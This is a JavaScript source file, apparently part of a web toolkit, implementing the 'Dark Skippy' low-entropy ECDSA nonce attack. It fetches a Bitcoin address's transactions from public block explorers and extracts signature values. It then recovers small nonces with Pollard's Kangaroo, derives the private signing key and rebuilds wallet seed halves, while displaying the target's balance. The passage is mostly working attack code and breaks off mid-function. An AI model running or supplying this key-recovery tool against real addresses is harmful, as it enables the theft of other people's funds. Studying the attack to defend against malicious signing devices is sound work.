/*
 * Dark Skippy — low-entropy ECDSA nonce recovery via Pollard's Kangaroo.
 * Engine for the CryptographyTube Tools collection. Self-contained: depends
 * only on CryptoJS (loaded before this file) for hashing / address + BIP-39
 * checksum. Exposes window.processTxid(), window.darkSkippyDemo(),
 * window.exportOne().
 *
 * The attack (darkskippy.com, 2024): a malicious signing device buries a
 * secret — the wallet seed, split into two halves — inside the ECDSA nonces
 * of the signatures it produces. Each nonce k is therefore a SMALL scalar
 * (a seed half). From any signature (r,s) on message hash z under public key
 * Q the public nonce point is recoverable as  R = k*G, and because k lives in
 * a small known range it can be extracted with Pollard's Kangaroo in
 * O(sqrt(range)) hops. One recovered nonce gives the signing key
 *     d = (s*k - z) / r        (mod n)
 * (verified d*G == Q, so no false positives); two recovered nonces are the two
 * seed halves and reconstruct the wallet's master secret.
 *
 * The heavy elliptic-curve work (Kangaroo + a live self-contained
 * live recovery that synthesises a victim and cracks it) runs in a Web Worker,
 * so the page never freezes. Pure BigInt secp256k1 — no DOM / CryptoJS / fetch
 * inside the worker.
 */
(function () {
    "use strict";

    // ---- Constants -------------------------------------------------------
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');

    // ---- Low-level converters -------------------------------------------
    function hexToBytes(hex) {
        if (!hex || typeof hex !== 'string') return new Uint8Array();
        if (hex.length % 2 !== 0) hex = '0' + hex;
        const matches = hex.match(/.{1,2}/g);
        if (!matches) return new Uint8Array();
        return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
    }
    function bytesToHex(bytes) {
        return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
    }
    function hexToBigInt(hex) { return BigInt('0x' + hex); }

    function reverseHex(hex) {
        if (hex.length % 2 !== 0) throw new Error("Hex string length is odd.");
        return hex.match(/.{1,2}/g).reverse().join('');
    }

    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8);
            return { val: val, size: 3 };
        }
        if (prefix === 0xFE) {
            let val = buf[offset + 1] | (buf[offset + 2] << 8) | (buf[offset + 3] << 16) | (buf[offset + 4] << 24);
            return { val: val, size: 5 };
        }
        return { val: buf[offset + 1], size: 9 };
    }

    // ---- Math ------------------------------------------------------------
    function modInverse(a, m) {
        if (a === 0n) throw new Error("Division by zero (no modular inverse)");
        let m0 = m;
        let x0 = 0n;
        let x1 = 1n;
        a %= m;

        while (a > 1n) {
            if (m === 0n) throw new Error("Modular inverse does not exist");
            let q = a / m;
            let t = m;

            m = a % m;
            a = t;

            t = x0;
            x0 = x1 - q * x0;
            x1 = t;
        }

        if (a === 0n) throw new Error("Modular inverse does not exist");

        if (x1 < 0n) {
            x1 += m0;
        }
        return x1;
    }

    // ---- Hashing (CryptoJS) ---------------------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }

    // ---- Base58 / address ------------------------------------------------
    function b58encode(hex) {
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) {
            str = ALPHABET[Number(num % 58n)] + str;
            num /= 58n;
        }
        for (let i = 0; i < hex.length; i += 2) {
            if (hex.substring(i, i + 2) === "00") str = "1" + str;
            else break;
        }
        return str;
    }

    function hash160ToAddress(hash160, version_byte) {
        const versioned_hash_hex = version_byte + hash160;
        const versioned_hash_bytes = CryptoJS.enc.Hex.parse(versioned_hash_hex);
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(versioned_hash_bytes)).toString().substring(0, 8);
        return b58encode(versioned_hash_hex + checksum);
    }

    function pubToAddr_P2PKH(pub_hex) {
        const pub_bin = hexToBytes(pub_hex);
        const sha256_hash = sha256hex(bytesToHex(pub_bin));
        const ripemd160_hash = ripe160hex(sha256_hash);
        return hash160ToAddress(ripemd160_hash, "00");
    }

    // ---- DER signature parsing ------------------------------------------
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null; // SEQUENCE (0x30)

            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;

            if (buf[pos + 2] !== 0x02) return null; // INTEGER (R-value)

            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;

            if (buf[r_end] !== 0x02) return null; // INTEGER (S-value)

            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;

            const r_bytes = buf.slice(r_start, r_end);
            const s_bytes = buf.slice(s_start, s_end);

            let r_hex = bytesToHex(r_bytes);
            let s_hex = bytesToHex(s_bytes);
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);

            const consumed = end - pos;
            return { r: r_hex, s: s_hex, len: consumed };
        } catch (e) {
            return null;
        }
    }

    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2); // Remove HashType
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2; // skip total length

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);

            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);

            return { r, s };
        } catch (e) { return {}; }
    }

    function parseScriptSig(scr) {
        const buf = hexToBytes(scr);
        let r = "", s = "", pub = "";

        // Scan for DER signature (P2PKH standard)
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r;
                s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = bytesToHex(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen));
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }

        // Fallback search for pubkey if not directly after signature
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = bytesToHex(buf.slice(i + 1, i + 1 + len));
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential;
                        break;
                    }
                }
            }
        }

        return { r, s, pub };
    }

    // ---- Transaction parsing --------------------------------------------
    function parseHexTransaction(txRaw) {
        const buf = hexToBytes(txRaw);
        let cursor = 0;

        const version = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;

        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) {
            isSegwit = true;
            cursor += 2;
        }

        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = bytesToHex(buf.slice(cursor, cursor + 32));
            const vout_raw = bytesToHex(buf.slice(cursor + 32, cursor + 36));
            cursor += 36;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + scriptLen.val)); cursor += scriptLen.val;
            const seq_raw = bytesToHex(buf.slice(cursor, cursor + 4)); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }

        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = bytesToHex(buf.slice(cursor, cursor + 8)); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = bytesToHex(buf.slice(cursor, cursor + outScriptLen.val)); cursor += outScriptLen.val;
            outputs.push({ value_raw, script_len_raw: (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0'))), script_hex });
        }

        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(bytesToHex(buf.slice(cursor, cursor + itemLen.val)));
                    cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }

        const locktime_raw = bytesToHex(buf.slice(cursor, cursor + 4));
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }

    function parsingRaw(rawtx) {
        return parseHexTransaction(rawtx);
    }

    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        // Legacy SIGHASH_ALL reconstruction
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));

        e += inCountHex;

        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;

            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }

        // Outputs
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) {
            e += out.value_raw + out.script_len_raw + out.script_hex;
        }

        e += fullTx.locktime_raw + "01000000"; // SIGHASH_ALL
        return dblsha256(e);
    }

    function getrsz(parsed) {
        const results = [];
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;

            // 1. Check Legacy scriptSig
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) {
                    r = sigData.r; s = sigData.s; pub = sigData.pub;
                }
            }

            // 2. Check Segwit Witness (If no legacy sig found)
            if (!r && inp.witness && inp.witness.length >= 2) {
                // In P2WPKH, Witness is [Signature, PubKey]
                const witnessSig = inp.witness[0];
                const witnessPub = inp.witness[1];
                if (witnessSig && witnessPub) {
                    const der = parseDER(witnessSig);
                    if (der.r) {
                        r = der.r; s = der.s; pub = witnessPub;
                    }
                }
            }

            if (!r || !s || !pub) continue;

            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            const addr = pubToAddr_P2PKH(pub);

            const z = getrsz_v2(parsed, i, scriptPubKey);

            results.push({
                input_index: i,
                addr: addr,
                r: r,
                s: s,
                z: z,
                pub: pub
            });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        if (!txid || txid.length !== 64) throw new Error("Invalid TXID");

        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];

        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) {
                console.warn(`Fallback: Failed to fetch from ${url}. Trying next...`);
            }
            await new Promise(r => setTimeout(r, 300));
        }

        throw new Error(`API Exhaustion: Could not fetch raw TX ${txid.substring(0, 8)}. Please wait a moment and retry.`);
    }

    // List an address's transaction ids, newest first, up to `want`.
    // Primary: blockstream.info Esplora (CORS-friendly, no API key, 25/page, paged
    // by last-seen txid). Fallback: blockchain.info rawaddr (offset paging).
    // Returns an array of txids, [] if the address genuinely has none, or null if
    // every explorer failed (network / CORS / rate-limit) so the caller can warn.
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;

        // --- blockstream.info Esplora (primary) ---
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;               // final (short) page
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];                          // responded OK but no txs
        } catch (e) { /* fall through to blockchain.info */ }

        // --- blockchain.info rawaddr (fallback) ---
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;                               // rawaddr max per request
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { /* both sources failed */ }

        return anyOk ? [] : null;
    }

    async function fetchBlockchainData(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];

        // 1) Collect exactly `want` tx ids for the address (capped at what exists).
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer for this address (it may be rate-limiting). Please wait a few seconds and try again, or lower the count.");
        }
        if (txHashes.length === 0) return results;         // address has no transactions

        // 2) For each tx: fetch raw hex, reconstruct R,S,Z, keep the inputs this
        //    address signed. Small concurrent batches + throttle to dodge rate limits.
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parsingRaw(raw);
                    const matched = getrsz(parsed).filter(it => it.addr === addr);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Address balance / activity stats (same box as Address Analysis) --
    function formatBtc(sats) {
        const n = Number(sats || 0) / 1e8;                 // < 2^53, safe for BTC supply
        const s = n.toFixed(8).replace(/\.?0+$/, '');
        return (s || '0') + ' BTC';
    }

    // Balance / Received / TX for an address. blockstream primary, blockchain.info
    // fallback. Returns {balance, received, tx} (satoshis) or null on total failure.
    async function fetchAddressStats(addr) {
        try {
            const resp = await fetch(`https://blockstream.info/api/address/${addr}`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                const c = d.chain_stats || {};
                const m = d.mempool_stats || {};
                const funded = (c.funded_txo_sum || 0) + (m.funded_txo_sum || 0);
                const spent = (c.spent_txo_sum || 0) + (m.spent_txo_sum || 0);
                const txc = (c.tx_count || 0) + (m.tx_count || 0);
                return { balance: funded - spent, received: funded, tx: txc };
            }
        } catch (e) { /* fall through */ }
        try {
            const resp = await fetch(`https://blockchain.info/rawaddr/${addr}?limit=0&cors=true`, { signal: AbortSignal.timeout(15000) });
            if (resp.ok) {
                const d = await resp.json();
                return { balance: d.final_balance || 0, received: d.total_received || 0, tx: d.n_tx || 0 };
            }
        } catch (e) { /* give up */ }
        return null;
    }

    // Rotating balance-check spinner — the same wheel the Public Key Toolkit /
    // private-keys pages show while an explorer request is in flight. Own class
    // (.txr-spin, not .fa-icon) so the global icon-tint filters never recolour it;
    // it is tinted + spun by tool.css.
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n +
            '" height="' + n + '" alt="loading">';
    }
    function setStats(stats) {
        const b = document.getElementById('txr-stat-balance');
        const r = document.getElementById('txr-stat-received');
        const t = document.getElementById('txr-stat-tx');
        // Turn the amount green when the address holds (Balance) or has ever held
        // (Received) coins — matching the private-keys balance colour (#22c55e).
        if (b) { b.textContent = stats ? formatBtc(stats.balance) : '0 BTC'; b.classList.toggle('has-balance', !!(stats && stats.balance > 0)); }
        if (r) { r.textContent = stats ? formatBtc(stats.received) : '0 BTC'; r.classList.toggle('has-balance', !!(stats && stats.received > 0)); }
        if (t) t.textContent = stats ? String(stats.tx) : '0';
    }
    // Show the spinner in the Balance / Received / TX boxes while their lookup runs.
    function statLoading() {
        ['txr-stat-balance', 'txr-stat-received', 'txr-stat-tx'].forEach(function (id) {
            const el = document.getElementById(id);
            if (el) { el.innerHTML = spinner(16); el.classList.remove('has-balance'); }
        });
    }

    async function resolveInputToRSZ(input, want, onProgress) {
        if (!input) return [];
        let inText = input.trim();
        // Detect if Address (roughly 26-62 chars, no colons)
        if (inText.length >= 26 && inText.length <= 62 && !inText.includes(':')) {
            return await fetchBlockchainData(inText, want, onProgress);
        }
        // Assume RSZ Bulk format
        return inText.split('\n').map(l => {
            let p = l.split(':');
            if (p.length >= 3) return { r: p[0].trim(), s: p[1].trim(), z: p[2].trim() };
            return null;
        }).filter(it => it && it.r.length > 50);
    }

    // ====================================================================
    //  Dark Skippy worker — secp256k1 + Pollard's Kangaroo (pure BigInt).
    //  Never runs on the main thread: it is stringified and spun up as a
    //  Worker so the O(sqrt(range)) hop loop never blocks the page.
    //  Two commands:
    //    {cmd:'scan', groups:[{addr,pub,sigs:[{r,s,z,txid}]}], bits, budgetMul,
    //                 maxSigs, globalBudget}
    //    {cmd:'demo', bits, budgetMul}   — synthesise a victim, sign twice with
    //                 seed-half nonces, then recover everything.
    //  Messages out: {type:'progress',…} … then {type:'done',mode,…} or
    //                {type:'error',message}.
    // ====================================================================
    function dsWorkerBody() {
        "use strict";
        var P = (2n ** 256n) - (2n ** 32n) - 977n;
        var N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141n;
        var Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
        var Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;

        function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
        // Iterative modular inverse (extended Euclid) — no recursion, so it can't
        // overflow a Web Worker's stack even on the deep chains a Kangaroo walk hits.
        function inv(a, m) {
            a = mod(a, m);
            if (a === 0n) throw new Error("no inverse");
            var m0 = m, x0 = 0n, x1 = 1n, aa = a, mm = m;
            while (aa > 1n) {
                if (mm === 0n) throw new Error("no inverse");
                var q = aa / mm;
                var t = mm; mm = aa % mm; aa = t;
                t = x0; x0 = x1 - q * x0; x1 = t;
            }
            if (x1 < 0n) x1 += m0;
            return x1;
        }
        function add(Pp, Qp) {
            if (!Pp) return Qp; if (!Qp) return Pp;
            if (Pp.x === Qp.x && mod(Pp.y + Qp.y, P) === 0n) return null;
            var l;
            if (Pp.x === Qp.x && Pp.y === Qp.y) l = mod(3n * Pp.x * Pp.x * inv(2n * Pp.y, P), P);
            else l = mod((Qp.y - Pp.y) * inv(mod(Qp.x - Pp.x, P), P), P);
            var x = mod(l * l - Pp.x - Qp.x, P);
            var y = mod(l * (Pp.x - x) - Pp.y, P);
            return { x: x, y: y };
        }
        function mul(k) { k = mod(k, N); var R = null, A = { x: Gx, y: Gy }; while (k > 0n) { if (k & 1n) R = add(R, A); A = add(A, A); k >>= 1n; } return R; }
        function powmod(a, e, m) { a = mod(a, m); var r = 1n; while (e > 0n) { if (e & 1n) r = mod(r * a, m); a = mod(a * a, m); e >>= 1n; } return r; }
        function ysqrt(x) { var a = mod(x * x * x + 7n, P); var y = powmod(a, (P + 1n) / 4n, P); return mod(y * y, P) === a ? y : null; }
        function bigSqrt(n) { if (n < 2n) return n; var x = n, y = (x + 1n) / 2n; while (y < x) { x = y; y = (x + n / x) / 2n; } return x; }
        function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
        function padhex(v, len) { var s = v.toString(16); while (s.length < len) s = "0" + s; return s; }
        function compressPoint(Q) { return (Q.y & 1n ? "03" : "02") + hx(Q.x); }
        function compressPub(pub) {
            pub = (pub || "").toLowerCase();
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                var x = pub.slice(2, 66), y = BigInt("0x" + pub.slice(66));
                return (y & 1n ? "03" : "02") + x;
            }
            return null;
        }
        // Full point {x,y} from a real compressed/uncompressed public key. Used by
        // the real-world solver (pubkey + range -> private key). Returns null if the
        // key is malformed or not on the curve.
        function pubToPoint(pub) {
            pub = (pub || "").toLowerCase().replace(/^0x/, "");
            if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) {
                var x = BigInt("0x" + pub.slice(2));
                var y = ysqrt(x); if (y === null) return null;
                var want = pub.slice(0, 2) === "03" ? 1n : 0n;
                if ((y & 1n) !== want) y = mod(P - y, P);
                return { x: x, y: y };
            }
            if (pub.length === 130 && pub.slice(0, 2) === "04") {
                return { x: BigInt("0x" + pub.slice(2, 66)), y: BigInt("0x" + pub.slice(66)) };
            }
            return null;
        }

        // Cryptographically-strong random scalars (WorkerGlobalScope.crypto).
        function randBits(nbits) {
            var nbytes = Math.ceil(nbits / 8) + 8;         // extra bytes so the mod below is ~uniform
            var arr = new Uint8Array(nbytes);
            self.crypto.getRandomValues(arr);
            var v = 0n;
            for (var i = 0; i < arr.length; i++) v = (v << 8n) | BigInt(arr[i]);
            return v;
        }
        function randRange(maxExclusive) {                 // ~uniform in [1, maxExclusive)
            if (maxExclusive <= 2n) return 1n;
            var bits = maxExclusive.toString(2).length;
            return (randBits(bits + 64) % (maxExclusive - 1n)) + 1n;
        }

        // Pollard's Kangaroo (lambda) with distinguished points, tame + wild
        // walks interleaved. Recovers k in [lo,hi] from R = k*G in ~2*sqrt(hi-lo)
        // hops. `report(steps)` is a throttled progress hook; `globalBudget`
        // caps total hops across a whole scan so the page can never hang.
        //
        // `salt` decorrelates the walk between parallel workers: the wild
        // kangaroo starts at R + salt*G (tracking distW = salt) instead of R,
        // so N workers with distinct salts explore N different trajectories and
        // the first to collide wins — a real multi-core (`-ncore N`) speed-up.
        // salt = 0n reproduces the classic single-walk behaviour exactly.
        function kangaroo(R, lo, hi, budgetMul, stats, report, globalBudget, salt) {
            var w = hi - lo;
            if (w < 0n) return null;
            if (w === 0n) { var Q0 = mul(lo); return (Q0 && Q0.x === R.x && Q0.y === R.y) ? lo : null; }
            salt = salt || 0n;
            var sw = bigSqrt(w);
            // jump table: powers of two, mean jump ~ 0.5*sqrt(w). mean{2^0..2^(t-1)}=(2^t-1)/t
            var t = 1; while (t < 64 && ((2n ** BigInt(t)) - 1n) / BigInt(t) < sw / 2n) t++;
            var K = t;
            var jS = [], jP = [];
            for (var i = 0; i < K; i++) { var s = 2n ** BigInt(i); jS.push(s); jP.push(mul(s)); }
            // distinguished-point mask ~ sqrt(w) so ~sqrt(w) DPs are expected over the walk
            var dpBits = 0; { var v = sw; while (v > 1n) { v >>= 1n; dpBits++; } dpBits = Math.max(1, dpBits - 2); }
            var dpMask = (1n << BigInt(dpBits)) - 1n;
            var idx = function (Pt) { return Number(Pt.x % BigInt(K)); };
            var isDP = function (Pt) { return (Pt.x & dpMask) === 0n; };
            var key = function (Pt) { return Pt.x.toString(36) + (Pt.y & 1n ? "1" : "0"); }; // full point (avoid ±x clash)

            var posT = mul(hi), distT = 0n;                // tame: starts at top of interval
            // wild: starts at (k + salt)*G so each worker walks a distinct path
            var posW = salt > 0n ? add(R, mul(salt)) : R, distW = salt;
            var tame = new Map(), wild = new Map();
            var budget = Math.floor(budgetMul * Number(sw)) + 2000;
            for (var step = 0; step < budget; step++) {
                stats.steps++;
                if (globalBudget && stats.steps > globalBudget) { stats.exhausted = true; return null; }
                if (report && (step & 0x3fff) === 0) report(stats.steps);
                { var jt = idx(posT); posT = add(posT, jP[jt]); distT += jS[jt];
                  if (posT && isDP(posT)) { var kt = key(posT);
                      if (wild.has(kt)) return hi + distT - wild.get(kt);
                      if (!tame.has(kt)) tame.set(kt, hi + distT);
                  } }
                { var jw = idx(posW); posW = add(posW, jP[jw]); distW += jS[jw];
                  if (posW && isDP(posW)) { var kw = key(posW);
                      if (tame.has(kw)) return tame.get(kw) - distW;
                      if (!wild.has(kw)) wild.set(kw, distW);
                  } }
            }
            return null;
        }

        // Recover the small nonce k (and hence the signing key d) from one
        // signature. r is the x-coordinate of R = k*G, so we try both y-parities
        // (this also absorbs any low-s normalisation). A candidate is accepted
        // only when d*G reproduces the on-chain compressed pubkey — so a hit is
        // never a false positive. Returns {d,k} or null.
        function recover(rHex, sHex, zHex, cpub, lo, hi, budgetMul, stats, report, globalBudget, salt) {
            var r = BigInt("0x" + rHex), s = BigInt("0x" + sHex), z = BigInt("0x" + zHex);
            var y0 = ysqrt(r); if (y0 === null) return null;
            var ys = [y0, mod(P - y0, P)];
            for (var yi = 0; yi < 2; yi++) {
                var R = { x: r, y: ys[yi] };
                var k = kangaroo(R, lo, hi, budgetMul, stats, report, globalBudget, salt);
                if (k === null || k < lo || k > hi) { if (stats.exhausted) return null; continue; }
                var Rc = mul(k); if (!Rc || Rc.x !== R.x || Rc.y !== R.y) continue;
                var d = mod((mod(s * k, N) - mod(z, N)) * inv(r, N), N);
                if (d <= 0n || d >= N) continue;
                var Q = mul(d); if (!Q) continue;
                if (compressPoint(Q) === cpub) return { d: d, k: k };
            }
            return null;
        }

        // Once d is known, every other signature's nonce is exact + free:
        // k = s^-1 (z + r*d) mod n. Used to sweep a cracked signer for its
        // second (and further) small nonce without another Kangaroo run.
        function nonceFor(rHex, sHex, zHex, d) {
            var r = BigInt("0x" + rHex), s = BigInt("0x" + sHex), z = BigInt("0x" + zHex);
            return mod(inv(s, N) * (mod(z, N) + mod(r, N) * d), N);
        }

        // Standard ECDSA sign (used only by the live recovery). No low-s
        // normalisation, so R reconstructs directly to k*G.
        function sign(d, k, z) {
            var R = mul(k); var r = mod(R.x, N);
            var s = mod(inv(k, N) * (mod(z, N) + mod(r, N) * d), N);
            return { r: r, s: s };
        }

        // Concatenate two recovered halves into the reconstructed master secret,
        // in both possible orders (we don't know a priori which half is high).
        function reconstruct(kHi, kLo, bits) {
            var secretBits = bits * 2;
            var hexlen = Math.ceil(secretBits / 4);
            function cat(hiv, lov) { return padhex((hiv << BigInt(bits)) | lov, hexlen); }
            return { secretBits: secretBits, secretHex: cat(kHi, kLo), altHex: cat(kLo, kHi) };
        }

        // ---- scan: recover low-entropy nonces from real signatures --------
        function doScan(data, post) {
            var bits = data.bits;
            var lo = 1n, hi = (1n << BigInt(bits)) - 1n;
            var budgetMul = data.budgetMul || 8;
            var maxSigs = data.maxSigs || 6;
            var globalBudget = data.globalBudget || 3000000;
            var salt = data.salt ? BigInt(data.salt) : 0n;   // per-core walk decorrelation
            var stats = { steps: 0, exhausted: false };
            var groups = data.groups || [];
            var results = [];

            for (var gi = 0; gi < groups.length; gi++) {
                var g = groups[gi];
                post({ type: "progress", phase: "signer", gi: gi, total: groups.length, addr: g.addr, count: g.sigs.length });
                var cpub = compressPub(g.pub);

                // de-dupe identical (r,s,z) so a repeated tx doesn't inflate work
                var seen = {}, sigs = [];
                for (var i = 0; i < g.sigs.length; i++) {
                    var sg = g.sigs[i];
                    var kk = sg.r + "_" + sg.s + "_" + sg.z;
                    if (!seen[kk]) { seen[kk] = 1; sigs.push(sg); }
                }
                var out = { addr: g.addr, pub: g.pub, count: sigs.length, found: false, hits: [], bits: bits };
                if (!cpub || sigs.length < 1) { results.push(out); continue; }
